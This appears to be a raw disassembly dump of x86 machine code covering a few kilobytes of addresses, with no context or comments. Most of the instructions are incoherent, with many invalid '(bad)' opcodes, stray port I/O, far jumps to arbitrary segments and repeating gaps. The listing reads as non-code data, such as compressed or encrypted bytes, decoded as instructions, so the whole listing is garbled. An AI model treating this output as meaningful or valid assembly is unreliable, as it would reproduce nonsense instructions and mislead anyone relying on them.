  4179f6:	lea    ecx,[edi]
  4179f8:	in     al,dx
  4179f9:	pop    ecx
  4179fa:	dec    esp
  4179fb:	mov    BYTE PTR [ecx+0x2a84639b],0x7d
  417a02:	aad    0x2c
  417a04:	pushf  
  417a05:	stc    
  417a06:	ret    0xd8ce
  417a09:	sbb    al,0x6f
  417a0b:	mov    ds:0x7f4b9e08,eax
  417a10:	enter  0x747c,0xb5
  417a14:	xor    ecx,DWORD PTR [edi-0x73]
  417a17:	pusha  
  417a18:	adc    eax,0xfe90ed68
  417a1d:	and    DWORD PTR [ecx],ebp
  417a1f:	xor    al,0x3a
  417a21:	adc    eax,0x63669af3
  417a26:	pop    ds
  417a27:	xchg   BYTE PTR [esi-0x14],ch
  417a2a:	xchg   esp,eax
  417a2b:	js     0x4179c4
  417a2d:	jge    0x417a45
  417a2f:	mov    ebx,0x10d23c7a
  417a34:	and    ebx,edi
  417a36:	dec    edx
  417a37:	nop
  417a38:	scas   al,BYTE PTR es:[edi]
  417a39:	pop    esp
  417a3a:	xchg   edx,eax
  417a3b:	leave  
  417a3c:	add    dl,BYTE PTR [esi]
  417a3e:	mov    ch,0x2b
  417a40:	mov    dh,0x97
  417a42:	fst    QWORD PTR [eax+0x41]
  417a45:	sub    DWORD PTR [edi+0x6d],esi
  417a48:	pop    ebx
  417a49:	aaa    
  417a4a:	test   DWORD PTR [ebx+0x62],edi
  417a4d:	pop    esp
  417a4e:	pop    ecx
  417a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a50:	data16 jl 0x417ace
  417a53:	mov    ebp,0xf999de4b
  417a58:	inc    esp
  417a59:	push   eax
  417a5a:	mov    eax,ds:0x5ff741c4
  417a5f:	add    eax,0x9678b3b3
  417a64:	xlat   BYTE PTR ds:[ebx]
  417a65:	lds    esp,FWORD PTR [ebp+0x36]
  417a68:	(bad)  
  417a69:	push   ecx
  417a6a:	mov    esp,0xb65ed6ea
  417a6f:	lods   al,BYTE PTR ds:[esi]
  417a70:	xor    esi,DWORD PTR [esi]
  417a72:	pop    edx
  417a73:	and    dh,0xbb
  417a76:	mov    al,ds:0x82718a36
  417a7b:	arpl   WORD PTR ds:0x46691dd7,sp
  417a81:	test   eax,0x44c4012c
  417a86:	arpl   WORD PTR [esi],ax
  417a88:	add    eax,DWORD PTR [edx+0x46]
  417a8b:	rol    ecx,0x15
  417a8e:	pop    edx
  417a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a90:	or     eax,DWORD PTR [eax]
	...
  417af2:	add    BYTE PTR [eax],al
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x3de0438e]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x84000001
  417b0d:	fcmovnbe st,st(7)
  417b0f:	jp     0x417b54
  417b11:	xchg   ebp,eax
  417b12:	sub    dl,BYTE PTR [edi]
  417b14:	mov    BYTE PTR [ebx],ch
  417b16:	mov    dh,0xa6
  417b18:	ja     0x417aff
  417b1a:	cmp    al,0x8
  417b1c:	and    al,al
  417b1e:	pushf  
  417b1f:	shl    DWORD PTR [esp+esi*8-0x70e4bdf2],1
  417b26:	sbb    al,BYTE PTR [ebx-0x4db9059c]
  417b2c:	jo     0x417abb
  417b2e:	or     DWORD PTR [ecx+ebp*2-0x4fc13a8b],esi
  417b35:	and    eax,0xbbcd4eaa
  417b3a:	jecxz  0x417bad
  417b3c:	pushf  
  417b3d:	cmp    DWORD PTR [ecx+eax*2-0x6697c4b9],ecx
  417b44:	retf   0x77d7
  417b47:	xchg   ebx,eax
  417b48:	cmp    al,dh
  417b4a:	call   0xd64d:0x7120bbe1
  417b51:	pop    ebx
  417b52:	pop    esp
  417b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b54:	mov    ecx,0x663dafc3
  417b59:	retf   
  417b5a:	dec    esi
  417b5b:	out    dx,al
  417b5c:	lods   al,BYTE PTR ds:[esi]
  417b5d:	ds mov ebp,0xf69951aa
  417b63:	jmp    0x5678:0xbc5a986f
  417b6a:	jg     0x417afd
  417b6c:	mov    BYTE PTR [esi-0x69],ah
  417b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b70:	leave  
  417b71:	pushf  
  417b72:	loopne 0x417b7e
  417b74:	lock pushf 
  417b76:	arpl   bp,dx
  417b78:	cmp    al,0xf4
  417b7a:	(bad)  
  417b7b:	ins    BYTE PTR es:[edi],dx
  417b7c:	dec    BYTE PTR [esi-0x1333115c]
  417b82:	fisub  DWORD PTR [ebx]
  417b84:	jle    0x417bbd
  417b86:	xchg   bp,ax
  417b88:	xchg   ebx,eax
  417b89:	std    
  417b8a:	rcl    BYTE PTR [esi+0x7a],1
  417b8d:	jg     0x417bcf
  417b8f:	or     ecx,DWORD PTR [ecx]
  417b91:	xchg   BYTE PTR [ebx],dl
  417b93:	jne    0x417b91
  417b95:	ins    DWORD PTR es:[edi],dx
  417b96:	add    al,0xba
  417b98:	jp     0x417b50
  417b9a:	ret    0xc82a
  417b9d:	sub    BYTE PTR [edi-0x588ce56],dl
  417ba3:	iret   
  417ba4:	and    edi,DWORD PTR [esi]
  417ba6:	add    DWORD PTR [eax-0x4c],ecx
  417ba9:	outs   dx,DWORD PTR ds:[esi]
  417baa:	inc    ebp
  417bab:	or     eax,0x5b19d0b9
  417bb0:	xchg   esi,eax
  417bb1:	jb     0x417b5c
  417bb3:	xchg   ebx,eax
  417bb4:	add    al,0xa7
  417bb6:	jno    0x417b3b
  417bb8:	dec    ebp
  417bb9:	xchg   ecx,eax
  417bba:	daa    
  417bbb:	pop    ds
  417bbc:	mov    BYTE PTR [esi+0x1a7573a5],al
  417bc2:	adc    edi,ebx
  417bc4:	cdq    
  417bc5:	and    eax,0xc04e2af7
  417bca:	dec    ebx
  417bcb:	out    dx,al
  417bcc:	push   ebx
  417bcd:	inc    ebx
  417bce:	jne    0x417c34
  417bd0:	sub    cl,BYTE PTR [ebp+0x7c17224c]
  417bd6:	lea    eax,[edx+eax*4-0x783bb57c]
  417bdd:	jge    0x417bf8
  417bdf:	mov    dh,0x2a
  417be1:	stos   BYTE PTR es:[edi],al
  417be2:	pop    edi
  417be3:	fistp  QWORD PTR [edi-0x3c7634f4]
  417be9:	xlat   BYTE PTR ds:[ebx]
  417bea:	cmp    BYTE PTR es:[edx],ah
  417bed:	popfw  
  417bef:	or     esi,edx
  417bf1:	push   ebp
  417bf2:	dec    esp
  417bf3:	xor    bh,dl
  417bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf6:	push   0x499b9d07
  417bfb:	dec    edi
  417bfc:	and    edx,DWORD PTR [eax+0x27]
  417bff:	sbb    ah,0xe8
  417c02:	mov    eax,ds:0x8f265c56
  417c07:	xchg   edi,eax
  417c08:	outs   dx,BYTE PTR ds:[esi]
  417c09:	lds    esp,FWORD PTR [ecx]
  417c0b:	cwde   
  417c0c:	xor    ch,BYTE PTR [eax+0x65]
  417c0f:	adc    BYTE PTR [eax+eax*1+0x0],bl
	...
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xdd
  417c81:	jb     0x417c87
  417c83:	inc    esp
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    al,bh
  417c8d:	out    dx,eax
  417c8e:	inc    ebp
  417c8f:	out    dx,al
  417c90:	push   0x98d04905
  417c95:	jmp    0x2b5b:0x1569d158
  417c9c:	repnz adc bh,ch
  417c9f:	or     eax,0xce827eb7
  417ca4:	mov    BYTE PTR [eax-0x4e223b7e],al
  417caa:	sar    DWORD PTR [ebx-0x4b],cl
  417cad:	xchg   ebp,eax
  417cae:	ret    
  417caf:	sub    ah,BYTE PTR [ecx]
  417cb1:	out    0x71,al
  417cb3:	jmp    0x417cd1
  417cb5:	add    bh,cl
  417cb7:	mov    edx,DWORD PTR [edx+0x351951b]
  417cbd:	stos   BYTE PTR es:[edi],al
  417cbe:	fild   WORD PTR [esi+0x621bbc85]
  417cc4:	aas    
  417cc5:	cmp    al,BYTE PTR [edx+edi*8]
  417cc8:	sub    cl,dh
  417cca:	pop    esi
  417ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ccc:	in     al,0xa3
  417cce:	xor    DWORD PTR [ebx-0x54],edx
  417cd1:	push   eax
  417cd2:	addr16 ss or al,0x56
  417cd6:	mov    esi,0x225b2d55
  417cdb:	dec    esp
  417cdc:	mov    eax,0x97a98a12
  417ce1:	call   0x8a3e89ab
  417ce6:	mov    cl,0x73
  417ce8:	pop    eax
  417ce9:	sub    ah,bh
  417ceb:	push   ebp
  417cec:	jns    0x417ccc
  417cee:	outs   dx,DWORD PTR ds:[esi]
  417cef:	and    DWORD PTR [esi+0x36],esp
  417cf2:	xchg   bh,al
  417cf4:	sub    BYTE PTR [eax+0x67],al
  417cf7:	lahf   
  417cf8:	in     eax,dx
  417cf9:	inc    edx
  417cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfb:	sar    eax,cl
  417cfd:	xor    al,0xcb
  417cff:	pop    edx
  417d00:	aad    0xdf
  417d02:	lea    edx,[edi]
  417d04:	push   esi
  417d05:	ins    DWORD PTR es:[edi],dx
  417d06:	(bad)  
  417d08:	inc    edx
  417d09:	outs   dx,DWORD PTR fs:[esi]
  417d0b:	mov    ch,0x16
  417d0d:	sub    bl,dh
  417d0f:	repnz cmp DWORD PTR [edi+0x9],ebx
  417d13:	popf   
  417d14:	add    ch,0x51
  417d17:	push   0x2f918f74
  417d1c:	sbb    ebp,eax
  417d1e:	xchg   ebp,eax
  417d1f:	ds sub al,0x8
  417d22:	aam    0xa8
  417d24:	out    dx,eax
  417d25:	mov    WORD PTR [ebx-0x2bc9ca8],es
  417d2b:	pop    ebp
  417d2c:	dec    edi
  417d2d:	(bad)  
  417d2e:	pop    es
  417d2f:	clc    
  417d30:	dec    ecx
  417d31:	(bad)  
  417d32:	jmp    0x417cc9
  417d34:	in     al,0x67
  417d36:	jmp    0xff15c316
  417d3b:	shl    BYTE PTR [eax+0x46],cl
  417d3e:	aam    0x4a
  417d40:	out    dx,eax
  417d41:	ja     0x417cfd
  417d43:	sub    DWORD PTR [edx+0x520069ef],0xffffffd4
  417d4a:	lods   al,BYTE PTR ds:[esi]
  417d4b:	ins    DWORD PTR es:[edi],dx
  417d4c:	add    DWORD PTR [eax+0x7ca8800f],ecx
  417d52:	fistp  DWORD PTR [ebp+0xb]
  417d55:	mov    cs:0x17c8a57e,al
  417d5b:	mov    ds,WORD PTR [ebx-0x12413f1e]
  417d61:	jl     0x417d09
  417d63:	mov    eax,ds:0x213ec13b
  417d68:	xchg   edi,eax
  417d69:	or     bl,dh
  417d6b:	sbb    eax,0x38ada685
  417d70:	(bad)  
  417d71:	push   edi
  417d72:	mov    WORD PTR [ebp+0x51],es
  417d75:	enter  0x6f34,0xc2
  417d79:	xor    DWORD PTR [ecx-0x51],ebp
  417d7c:	pop    edi
  417d7d:	dec    esp
  417d7e:	mov    dh,0xbd
  417d80:	ins    BYTE PTR es:[edi],dx
  417d81:	and    eax,0xdd04466b
  417d86:	and    ebp,DWORD PTR [esi-0x6b]
  417d89:	push   ebp
  417d8a:	pop    edx
  417d8b:	pop    ebx
  417d8c:	fwait
  417d8d:	(bad)  
  417d8e:	pop    edx
  417d8f:	stc    
  417d90:	dec    ebp
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	jb     0x417df5
  417e02:	cmp    eax,0xfcae60
  417e07:	add    BYTE PTR ds:0x7b000001,al
  417e0d:	icebp  
  417e0e:	in     eax,dx
  417e0f:	xchg   ebx,eax
  417e10:	jmp    0xb9f4:0xdda8cc26
  417e17:	cmp    esi,DWORD PTR [edi+eax*2]
  417e1a:	pop    edi
  417e1b:	shl    BYTE PTR [ebx],1
  417e1d:	push   eax
  417e1e:	cmp    eax,0x641e609
  417e23:	fs scas al,BYTE PTR es:[edi]
  417e25:	int    0xaf
  417e27:	outs   dx,WORD PTR ds:[esi]
  417e29:	stos   DWORD PTR es:[edi],eax
  417e2a:	out    dx,al
  417e2b:	dec    esp
  417e2c:	mov    ebx,0x292227ef
  417e31:	mov    BYTE PTR [edx+0xa8d84b3],dh
  417e37:	xlat   BYTE PTR ds:[ebx]
  417e38:	inc    ebx
  417e39:	adc    BYTE PTR [edx-0x446fd293],bh
  417e3f:	mov    al,0x4
  417e41:	popa   
  417e42:	push   0xffffff86
  417e44:	mov    al,0x76
  417e46:	in     al,dx
  417e47:	je     0x417dea
  417e49:	pop    esp
  417e4a:	cmp    dl,BYTE PTR [eax-0x42]
  417e4d:	mov    DWORD PTR [edi+0x5b6b1823],0xc41ba943
  417e57:	push   edx
  417e58:	pop    es
  417e59:	push   ds
  417e5a:	jmp    0xed67:0xfd3f39b4
  417e61:	je     0x417de7
  417e63:	xor    BYTE PTR [esi],ah
  417e65:	add    al,0x28
  417e67:	pop    ecx
  417e68:	push   ebx
  417e69:	mov    ds:0x3448e8d8,eax
  417e6e:	or     DWORD PTR [eax-0x3a],0x6f
  417e72:	xchg   ebp,eax
  417e73:	fdiv   DWORD PTR [eax+ecx*4]
  417e76:	push   esi
  417e77:	or     eax,0x53fec0a1
  417e7c:	push   eax
  417e7d:	jns    0x417eea
  417e7f:	mov    al,0x0
  417e81:	xor    di,WORD PTR [esi]
  417e84:	js     0x417edf
  417e86:	aas    
  417e87:	lds    esp,FWORD PTR [ecx]
  417e89:	mov    esi,DWORD PTR [edi+0x46a8c4a0]
  417e8f:	adc    ah,BYTE PTR [ebx-0x48b1dd6]
  417e95:	hlt    
  417e96:	add    esi,esp
  417e98:	mov    bh,BYTE PTR [edx+0x49]
  417e9b:	mov    ss,WORD PTR [ebx+0x78]
  417e9e:	cmp    eax,DWORD PTR [ebp+0x27]
  417ea1:	stos   BYTE PTR es:[edi],al
  417ea2:	jnp    0x417e8e
  417ea4:	loopne 0x417efb
  417ea6:	mov    ds:0x566646c7,al
  417eab:	fdivr  st(3),st
  417ead:	(bad)  
  417eaf:	popf   
  417eb0:	cwde   
  417eb1:	rcr    BYTE PTR [esi+0x3e01215c],cl
  417eb7:	repnz int 0x44
  417eba:	ins    DWORD PTR es:[edi],dx
  417ebb:	lods   al,BYTE PTR ds:[esi]
  417ebc:	enter  0xe711,0xfe
  417ec0:	cld    
  417ec1:	or     ebx,DWORD PTR [edx]
  417ec3:	int3   
  417ec4:	sbb    al,BYTE PTR [ebp-0x46]
  417ec7:	add    al,0x17
  417ec9:	loope  0x417ece
  417ecb:	jl     0x417f3d
  417ecd:	data16 mov BYTE PTR [ebp+0x3d],bl
  417ed1:	sub    BYTE PTR [ecx-0x3708e4ff],dl
  417ed7:	(bad)  
  417ed8:	adc    ch,BYTE PTR [ebx]
  417eda:	pop    eax
  417edb:	add    esp,esi
  417edd:	lods   eax,DWORD PTR ds:[esi]
  417ede:	ds pop ebx
  417ee0:	adc    BYTE PTR [ebx-0x51],cl
  417ee3:	ret    
  417ee4:	pop    esi
  417ee5:	mov    al,0x83
  417ee7:	xchg   ebx,eax
  417ee8:	push   esi
  417ee9:	scas   eax,DWORD PTR es:[edi]
  417eea:	jmp    0x417ec1
  417eec:	or     eax,0xae67b3e7
  417ef1:	cmp    BYTE PTR [edi+0x23bc8082],ch
  417ef7:	and    eax,0x93880938
  417efc:	xor    BYTE PTR [edi-0xe],dh
  417eff:	sar    BYTE PTR [edi-0x1a],1
  417f02:	or     BYTE PTR [esi+eax*8],0x49
  417f06:	mov    ah,0x88
  417f08:	inc    esi
  417f09:	scas   eax,DWORD PTR es:[edi]
  417f0a:	cwde   
  417f0b:	pop    ebx
  417f0c:	push   eax
  417f0d:	repz jle 0x417f82
  417f10:	dec    eax
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	(bad)  
  417f81:	jmp    DWORD PTR [eax+0xfdb384]
  417f87:	add    BYTE PTR ds:0x11000001,al
  417f8d:	rcr    ebp,1
  417f8f:	hlt    
  417f90:	out    dx,al
  417f91:	fsub   QWORD PTR [edx-0x633074d9]
  417f97:	(bad)  
  417f98:	jmp    0x417fd6
  417f9a:	add    cl,BYTE PTR [ebp-0x31a90e1f]
  417fa0:	call   0x3c28:0x9d2bc52c
  417fa7:	repz xor cl,BYTE PTR [ebp+0xa]
  417fab:	xchg   BYTE PTR [ecx-0x7b672495],ah
  417fb1:	ins    DWORD PTR es:[edi],dx
  417fb2:	lea    edx,ds:0x7153c1fa
  417fb8:	psubsw mm3,mm3
  417fbb:	pushf  
  417fbc:	inc    DWORD PTR [ecx]
  417fbe:	test   al,0x88
  417fc0:	pop    edx
  417fc1:	into   
  417fc2:	(bad)  
  417fc3:	jmp    0x77d4:0xdbdf0461
  417fca:	out    dx,eax
  417fcb:	mov    bl,0x78
  417fcd:	shl    ebx,cl
  417fcf:	sti    
  417fd0:	fs loopne 0x417f70
  417fd3:	cmp    DWORD PTR [edx+0x69],0xae91643
  417fda:	es in  al,0xb0
  417fdd:	lods   al,BYTE PTR ds:[esi]
  417fde:	mov    ds:0x54f3c6f6,al
  417fe3:	mov    dl,0x88
  417fe5:	ret    
  417fe6:	push   0x93324b8b
  417feb:	ss in  al,0xd
  417fee:	xor    bh,BYTE PTR [ebp-0x50]
  417ff1:	shl    BYTE PTR [eax-0x33985cee],cl
  417ff7:	daa    
  417ff8:	xchg   ecx,eax
  417ff9:	sub    BYTE PTR [ebp+edi*1+0x5e],ch
  417ffd:	mov    BYTE PTR [ecx-0x4c],ch
  418000:	test   dh,dh
  418002:	int3   
  418003:	mov    DWORD PTR [ecx-0x36fd2257],ecx
  418009:	sub    DWORD PTR [esi-0x4b20c3e8],esi
  41800f:	loop   0x418027
  418011:	sar    BYTE PTR [eax+0x2cdbada6],cl
  418017:	clc    
  418018:	std    
  418019:	xlat   BYTE PTR ds:[ebx]
  41801a:	out    0xd7,al
  41801c:	ja     0x418053
  41801e:	cmp    BYTE PTR [ebp-0x57],bh
  418021:	loope  0x41806d
  418023:	push   0xac8803f4
  418028:	sub    dh,ah
  41802a:	mov    BYTE PTR [ebx],al
  41802c:	pop    esp
  41802d:	nop
  41802e:	gs (bad) 
  418030:	jmp    DWORD PTR [edx]
  418032:	sar    DWORD PTR [ebp+esi*2+0x7],0x5
  418037:	add    edi,ecx
  418039:	aad    0xaa
  41803b:	push   cs
  41803c:	aaa    
  41803d:	dec    edx
  41803e:	push   0xffffffe0
  418040:	popa   
  418041:	xchg   BYTE PTR [esi],dl
  418043:	push   edx
  418044:	add    eax,0x1c85fcdd
  418049:	xor    eax,0x6f39c391
  41804e:	packsswb mm6,QWORD PTR [edi-0x9]
  418052:	ret    
  418053:	paddusw mm2,mm3
  418056:	xchg   ebx,eax
  418057:	aas    
  418058:	mov    al,0xca
  41805a:	test   BYTE PTR [edx+edi*1],ah
  41805d:	sar    BYTE PTR [edi-0x1c],1
  418060:	gs pushf 
  418062:	retf   0x59e6
  418065:	retf   
  418066:	sti    
  418067:	fdiv   QWORD PTR [ebp+0x3f]
  41806a:	test   DWORD PTR [esi],0x3fa5308d
  418070:	add    edi,esp
  418072:	inc    ebx
  418073:	call   0x25f:0x751b0bf0
  41807a:	(bad)  
  41807b:	sahf   
  41807c:	and    ecx,eax
  41807e:	sub    dl,al
  418080:	stos   BYTE PTR es:[edi],al
  418081:	in     al,0x74
  418083:	cmp    si,bp
  418086:	mov    ebp,0x4c92d77
  41808b:	jg     0x418065
  41808d:	scas   al,BYTE PTR es:[edi]
  41808e:	shl    bh,cl
  418090:	and    al,BYTE PTR [eax]
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x3d2fdebc,eax
  418101:	pop    edx
  418102:	ror    BYTE PTR [edx],0xb8
  418105:	inc    BYTE PTR [eax]
  418107:	add    BYTE PTR ds:0xf1000001,al
  41810d:	(bad)  
  41810e:	popa   
  41810f:	scas   eax,DWORD PTR es:[edi]
  418110:	arpl   WORD PTR [edi],di
  418112:	div    DWORD PTR [ebx+0x6666fd0]
  418118:	stos   BYTE PTR es:[edi],al
  418119:	sbb    al,0x61
  41811b:	mov    dl,BYTE PTR [eax-0x67]
  41811e:	test   BYTE PTR [ebp+0x3693ac0a],bl
  418124:	ins    DWORD PTR es:[edi],dx
  418125:	pop    eax
  418126:	jne    0x4180a9
  418128:	jmp    FWORD PTR [ebx-0x7cea9490]
  41812e:	stc    
  41812f:	shl    DWORD PTR [esp+eax*4+0x2e4509f2],1
  418136:	dec    ebp
  418137:	mov    al,0x22
  418139:	loop   0x41812b
  41813b:	jg     0x4181a2
  41813d:	loop   0x41812a
  41813f:	adc    al,BYTE PTR [ebx]
  418141:	xchg   edi,eax
  418142:	cdq    
  418143:	xor    ah,BYTE PTR [ebx+0x7c]
  418146:	add    al,0x9a
  418148:	neg    BYTE PTR [ebp+0x394f8f2c]
  41814e:	pop    edi
  41814f:	lahf   
  418150:	dec    ebp
  418151:	mov    esp,0xdec31403
  418156:	mov    dh,0x4a
  418158:	mov    DWORD PTR [edi],esp
  41815a:	push   ebx
  41815b:	pop    esi
  41815c:	leave  
  41815d:	adc    dh,ah
  41815f:	les    ebx,FWORD PTR es:[ecx]
  418162:	push   esi
  418163:	inc    edi
  418164:	icebp  
  418165:	add    BYTE PTR [ebx-0x797f6770],dl
  41816b:	cwde   
  41816c:	or     BYTE PTR [ecx+0x75],dl
  41816f:	sar    DWORD PTR [ebx-0x75],0x6e
  418173:	sub    DWORD PTR [edx-0x332f91b7],eax
  418179:	bound  eax,QWORD PTR [ebx-0x5e]
  41817c:	inc    edi
  41817d:	mov    dh,0x7f
  41817f:	inc    edi
  418180:	jecxz  0x4181cf
  418182:	sbb    BYTE PTR [ecx-0x70],ch
  418185:	ret    0x2404
  418188:	adc    bl,ah
  41818a:	aaa    
  41818b:	jmp    0xeea4:0xf10e43a8
  418192:	inc    esi
  418193:	in     eax,0x9c
  418195:	ins    BYTE PTR es:[edi],dx
  418196:	in     al,0xd0
  418198:	fs jp  0x41818c
  41819b:	aas    
  41819c:	sub    eax,0x15a4f7c3
  4181a1:	or     DWORD PTR [eax],edx
  4181a3:	imul   ebp,DWORD PTR [ebx+0x29df89d3],0x54910590
  4181ad:	pop    ebp
  4181ae:	inc    edi
  4181af:	test   al,0x14
  4181b1:	sub    sp,WORD PTR cs:[ecx+ecx*1]
  4181b6:	hlt    
  4181b7:	pop    ss
  4181b8:	in     eax,0xc6
  4181ba:	push   esi
  4181bb:	mov    ds:0x54ac5da2,al
  4181c0:	inc    ebx
  4181c1:	outs   dx,DWORD PTR ds:[esi]
  4181c2:	xchg   edx,eax
  4181c3:	inc    eax
  4181c4:	test   ebx,ecx
  4181c6:	fdiv   QWORD PTR [edi+0x211377b]
  4181cc:	dec    DWORD PTR [edi+0x47]
  4181cf:	out    dx,eax
  4181d0:	sbb    BYTE PTR [ecx+0x1],ch
  4181d3:	pusha  
  4181d4:	ret    
  4181d5:	inc    ecx
  4181d6:	shl    DWORD PTR [eax-0x23374734],1
  4181dc:	shl    DWORD PTR [ecx-0x580246a5],0x61
  4181e3:	les    esi,FWORD PTR [esi+0x65]
  4181e6:	bound  esp,QWORD PTR [ebp+0x5f]
  4181e9:	(bad)  
  4181ea:	sbb    al,0xe9
  4181ec:	sub    dl,BYTE PTR [edx]
  4181ee:	mov    edx,0x8fc5ffd9
  4181f3:	cdq    
  4181f4:	push   ebx
  4181f5:	ins    DWORD PTR es:[edi],dx
  4181f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f7:	or     esp,0xffffff9b
  4181fa:	daa    
  4181fb:	and    ebp,DWORD PTR [ecx-0x6]
  4181fe:	add    DWORD PTR [ecx+0x5dca8627],ebp
  418204:	xchg   edx,eax
  418205:	lahf   
  418206:	push   edi
  418207:	out    0x9e,al
  418209:	stos   DWORD PTR es:[edi],eax
  41820a:	jne    0x418217
  41820c:	ror    ebp,1
  41820e:	out    dx,al
  41820f:	stc    
  418210:	retf   0x0
	...
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x468bb8d6
  418282:	outs   dx,DWORD PTR ds:[esi]
  418283:	xlat   BYTE PTR ds:[ebx]
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [edi-0x19102929],ah
  418291:	sub    BYTE PTR [edx+0x47],0x6b
  418295:	pop    ebx
  418296:	sub    al,0x2c
  418298:	jbe    0x41826d
  41829a:	stos   BYTE PTR es:[edi],al
  41829b:	lock fwait
  41829d:	(bad)  
  41829e:	cmp    eax,0xef89fd5b
  4182a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a4:	ja     0x4182ad
  4182a6:	out    dx,al
  4182a7:	shr    BYTE PTR [ecx-0x24d9f24c],1
  4182ad:	push   ebx
  4182ae:	xchg   ecx,eax
  4182af:	xor    eax,0x6f91e781
  4182b4:	add    eax,0xe17a0c86
  4182b9:	jne    0x418244
  4182bb:	neg    BYTE PTR [esi+0x74]
  4182be:	push   cs
  4182bf:	sub    eax,0x41e9444
  4182c4:	push   di
  4182c6:	mov    cl,0x3
  4182c8:	jecxz  0x418334
  4182ca:	xchg   ebx,eax
  4182cb:	int    0xee
  4182cd:	push   ecx
  4182ce:	in     eax,dx
  4182cf:	shl    al,cl
  4182d1:	test   al,0x7e
  4182d3:	add    eax,0x2093f8db
  4182d8:	and    eax,0x3070cea1
  4182dd:	mov    WORD PTR [ecx+0x3],?
  4182e0:	mov    eax,0x1a0184da
  4182e5:	dec    esp
  4182e6:	loop   0x4182c6
  4182e8:	mov    esp,0x59367e38
  4182ed:	jge    0x418310
  4182ef:	mov    ?,ebx
  4182f1:	jmp    0x418313
  4182f3:	pop    eax
  4182f4:	out    0x8e,al
  4182f6:	popf   
  4182f7:	(bad)  
  4182f8:	sbb    BYTE PTR [edi],0x84
  4182fb:	fisttp WORD PTR [ebp+eax*8+0x51211487]
  418302:	xchg   esp,eax
  418303:	mov    edx,0x7e4cc44d
  418308:	rcl    DWORD PTR [ecx],1
  41830a:	mov    esp,0x7109021d
  41830f:	jp     0x418369
  418311:	test   eax,0x66a57dda
  418316:	les    esp,FWORD PTR es:[esi-0x38c1cbfb]
  41831d:	sbb    esp,DWORD PTR [ebp+0x2c3f8c63]
  418323:	cli    
  418324:	xchg   esi,eax
  418325:	es push esp
  418327:	inc    eax
  418328:	adc    bh,BYTE PTR [edi+ebx*8-0x36e1c072]
  41832f:	push   ss
  418330:	ficom  DWORD PTR [ecx-0x1ee3e8c2]
  418336:	fstp   TBYTE PTR [edx-0x5d]
  418339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833a:	nop
  41833b:	mov    WORD PTR [edx],fs
  41833d:	mov    esp,esp
  41833f:	add    BYTE PTR [eax+0x39bd8ee9],0x93
  418346:	fcom   QWORD PTR [eax-0xa]
  418349:	ret    
  41834a:	or     dh,BYTE PTR [esi+eax*1-0x1fd11d05]
  418351:	mov    eax,ds:0x2538d6ec
  418356:	jp     0x41833f
  418358:	(bad)  
  418359:	enter  0x21ec,0xb1
  41835d:	add    eax,0x5c4f0332
  418362:	mov    cl,0x8
  418364:	aam    0xc2
  418366:	jns    0x418312
  418368:	ins    DWORD PTR es:[edi],dx
  418369:	outs   dx,DWORD PTR ds:[esi]
  41836a:	jb     0x41834c
  41836c:	pushf  
  41836d:	cmp    eax,0x5556cc84
  418372:	mov    ebx,DWORD PTR [ecx]
  418374:	sbb    esi,DWORD PTR [esi]
  418376:	je     0x4183bd
  418378:	loop   0x418361
  41837a:	mov    cl,0xde
  41837c:	sbb    BYTE PTR [edx],ah
  41837e:	pop    ss
  41837f:	and    DWORD PTR [edi-0x4b],esi
  418382:	inc    edx
  418383:	pop    edx
  418384:	and    al,0xc9
  418386:	adc    eax,0x97f66ac3
  41838b:	jmp    0x4183fd
  41838d:	rcr    BYTE PTR [ebx],cl
  41838f:	pop    ds
  418390:	add    eax,0x0
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	and    bl,bh
  418402:	xchg   esi,eax
  418403:	or     al,0xc2
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR ds:0xc4000001,al
  41840d:	popf   
  41840e:	inc    ebx
  41840f:	shr    BYTE PTR [ebx-0x34],cl
  418412:	imul   ecx,DWORD PTR [edi+edi*4+0x662a031],0x6559923c
